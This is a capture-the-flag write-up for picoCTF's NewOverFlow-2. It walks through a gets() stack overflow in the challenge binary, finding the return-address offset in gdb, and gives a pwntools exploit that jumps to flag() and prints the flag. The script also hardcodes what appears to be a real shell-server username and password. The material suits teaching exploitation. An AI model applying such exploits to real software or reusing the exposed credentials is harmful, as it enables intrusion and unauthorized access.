# Problem
Okay now lets try mainpulating arguments. [program](https://2019shell1.picoctf.com/static/9b7f5c6e1ff8b3b570ce93d4b470e586/vuln). You can find it in /problems/newoverflow-2_2_1428488532921ee33e0ceb92267e30a7 on the shell server. [Source](https://2019shell1.picoctf.com/static/9b7f5c6e1ff8b3b570ce93d4b470e586/vuln.c).

## Hints:

Arguments aren't stored on the stack anymore ;)

## Solution:

Lets download the files:
```bash
wget https://2019shell1.picoctf.com/static/9b7f5c6e1ff8b3b570ce93d4b470e586/vuln
wget https://2019shell1.picoctf.com/static/9b7f5c6e1ff8b3b570ce93d4b470e586/vuln.c
```

First, we investigate the source
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdbool.h>

#define BUFFSIZE 64
#define FLAGSIZE 64

bool win1 = false;
bool win2 = false;

void win_fn1(unsigned int arg_check) {
  if (arg_check == 0xDEADBEEF) {
    win1 = true;
  }
}

void win_fn2(unsigned int arg_check1, unsigned int arg_check2, unsigned int arg_check3) {
  if (win1 && \
      arg_check1 == 0xBAADCAFE && \
      arg_check2 == 0xCAFEBABE && \
      arg_check3 == 0xABADBABE) {
    win2 = true;
  }
}

void win_fn() {
  char flag[48];
  FILE *file;
  file = fopen("flag.txt", "r");
  if (file == NULL) {
    printf("'flag.txt' missing in the current directory!\n");
    exit(0);
  }

  fgets(flag, sizeof(flag), file);
  if (win1 && win2) {
    printf("%s", flag);
    return;
  }
  else {
    printf("Nope, not quite...\n");
  }


  

}

void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("'flag.txt' missing in the current directory!\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFFSIZE];
  gets(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  puts("Welcome to 64-bit. Can you match these numbers?");
  vuln();
  return 0;
}
```

The goal of this challenge is to teach us [ROP](https://en.wikipedia.org/wiki/Return-oriented_programming).

The conditions required for getting the flag are ```win1 && win2``` followed by a call to ```win_fn```.
```win1``` will be set when we call ```win_fn1(0xDEADBEEF)``` , and ```win2``` will be set when we call ```win_function2(0xBAADCAFE, 0xCAFEBABE, 0xABADBABE)``` afterwards.

First we need to calculate the offset of the return address in ```vuln()``` (we need to override it with our rop chain), we can use this gdbinit script.

```
run < <(echo AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHHIIIIIIIIJJJJJJJJKKKKKKKKLLLLLLLLMMMMMMMMNNNNNNNNOOOOOOOO)
p $rbp
```

Lets debug:
```bash
gdb -x ./gdbinit ./vuln

Stopped reason: SIGSEGV
0x00000000004008cd in vuln ()
$1 = (void *) 0x4949494949494949
```

We know that ```JJJJJJJJ``` overrides the return address.

Hey, stop! We also have ```flag``` as before. Same code as in NewOverFlow-1 should work as well.


Now lets write a simple python script:
```python
#!/usr/bin/env python

from pwn import *


debug = 0

user = 'RoeeSefi'
pw = 'UTTE9CQN2idX28W'

if debug:
  p = process('./vuln')
else:
  s = ssh(host = '2019shell1.picoctf.com', user=user, password=pw)
  s.set_working_directory('/problems/newoverflow-2_2_1428488532921ee33e0ceb92267e30a7')
  p = s.process('./vuln')

binary = ELF('./vuln')
ret = binary.search(asm('ret')).next()

print p.recvuntil('Welcome to 64-bit. Can you match these numbers?')
p.sendline('AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHHIIIIIIII' + p64(ret) + p64(binary.symbols['flag']))

print p.recvall()
```

Flag: picoCTF{r0p_1t_d0nT_st0p_1t_64362a2b}